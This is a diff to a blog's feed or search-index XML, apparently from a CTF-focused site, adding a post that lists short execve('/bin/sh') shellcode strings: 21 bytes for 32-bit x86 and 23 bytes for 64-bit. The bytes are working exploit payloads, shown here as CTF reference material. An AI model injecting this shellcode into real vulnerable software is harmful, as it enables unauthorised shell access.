@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>较短的shellcode</title>
+      <link href="/2024/03/08/%E8%BE%83%E7%9F%AD%E7%9A%84shellcode/"/>
+      <url>/2024/03/08/%E8%BE%83%E7%9F%AD%E7%9A%84shellcode/</url>
+      
+        <content type="html"><![CDATA[<p>较短的shellcode <span id="more"></span></p><p>32位（21字节）<br>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p><p>64位（23字节）<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>LibcSearcher_update</title>
       <link href="/2024/02/29/LibcSearcher-update/"/>
       <url>/2024/02/29/LibcSearcher-update/</url>
